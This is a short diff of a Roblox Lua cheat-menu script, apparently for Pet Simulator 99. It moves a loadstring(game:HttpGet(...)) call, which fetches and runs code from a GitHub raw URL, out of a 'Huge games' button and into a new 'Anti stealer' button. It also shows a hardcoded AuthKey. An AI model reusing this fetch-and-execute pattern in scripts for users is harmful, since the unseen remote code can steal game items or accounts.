@@ -8,10 +8,16 @@ local MainTab = Window:MakeTab({
 })
 
 MainTab:AddButton({
+	Name = "Anti stealer",
+	Callback = function()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/Darks-scripts/Anti-mail-stealer-ps99/main/antistealer"))()
+  	end    
+})
+
+
+MainTab:AddButton({
 	Name = "Huge games",
 	Callback = function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Darks-scripts/Anti-mail-stealer-ps99/main/antistealer"))()
-
       		getgenv().AuthKey = "HUGE_3C4qcDEzpSth"
 getgenv().LoadSettings = {
     Example_Setting = Example_Value
